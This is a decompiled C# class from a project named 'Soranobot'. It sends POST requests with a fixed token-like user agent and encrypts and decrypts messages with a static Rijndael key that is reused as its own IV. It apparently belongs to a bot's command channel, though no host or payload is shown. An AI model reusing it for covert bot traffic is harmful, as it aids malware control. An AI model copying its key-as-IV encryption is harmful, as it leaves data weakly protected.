using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;

namespace Soranobot.Classes
{
	// Token: 0x0200000C RID: 12
	internal class Communication
	{
		// Token: 0x0600002B RID: 43 RVA: 0x00002C78 File Offset: 0x00000E78
		public static string makeRequest(string url, string parameters)
		{
			string result;
			try
			{
				byte[] bytes = Encoding.UTF8.GetBytes(parameters);
				WebRequest webRequest = WebRequest.Create(url);
				webRequest.Method = "POST";
				((HttpWebRequest)webRequest).UserAgent = "E9BC3BD76216AFA560BFB5ACAF5731A3";
				webRequest.ContentType = "application/x-www-form-urlencoded";
				webRequest.ContentLength = (long)bytes.Length;
				Stream requestStream = webRequest.GetRequestStream();
				requestStream.Write(bytes, 0, bytes.Length);
				requestStream.Close();
				requestStream.Dispose();
				WebResponse response = webRequest.GetResponse();
				StreamReader streamReader = new StreamReader(response.GetResponseStream());
				string text = streamReader.ReadToEnd();
				streamReader.Close();
				streamReader.Dispose();
				response.Close();
				result = text;
			}
			catch
			{
				result = "rqf";
			}
			return result;
		}

		// Token: 0x0600002C RID: 44 RVA: 0x00002D2C File Offset: 0x00000F2C
		public static string encrypt(string input)
		{
			string result;
			try
			{
				string edkey = Settings.edkey;
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.Padding = PaddingMode.Zeros;
				rijndaelManaged.Mode = CipherMode.CBC;
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 256;
				byte[] bytes = Encoding.ASCII.GetBytes(edkey);
				byte[] bytes2 = Encoding.ASCII.GetBytes(input);
				ICryptoTransform transform = rijndaelManaged.CreateEncryptor(bytes, bytes);
				byte[] inArray;
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
					{
						cryptoStream.Write(bytes2, 0, bytes2.Length);
						cryptoStream.FlushFinalBlock();
						cryptoStream.Close();
						cryptoStream.Dispose();
					}
					inArray = memoryStream.ToArray();
					memoryStream.Close();
					memoryStream.Dispose();
				}
				result = Convert.ToBase64String(inArray).Replace("+", "~");
			}
			catch
			{
				result = null;
			}
			return result;
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00002E38 File Offset: 0x00001038
		public static string decrypt(string input)
		{
			string result;
			try
			{
				string edkey = Settings.edkey;
				RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.Padding = PaddingMode.Zeros;
				rijndaelManaged.Mode = CipherMode.CBC;
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 256;
				byte[] bytes = Encoding.ASCII.GetBytes(edkey);
				byte[] array = Convert.FromBase64String(input);
				byte[] array2 = new byte[array.Length];
				ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes, bytes);
				using (MemoryStream memoryStream = new MemoryStream(array))
				{
					using (CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read))
					{
						cryptoStream.Read(array2, 0, array2.Length);
						cryptoStream.Close();
						cryptoStream.Dispose();
					}
					memoryStream.Close();
					memoryStream.Dispose();
				}
				result = Encoding.UTF8.GetString(array2).Trim().Replace("\0", "");
			}
			catch (Exception ex)
			{
				result = ex.Message;
			}
			return result;
		}
	}
}
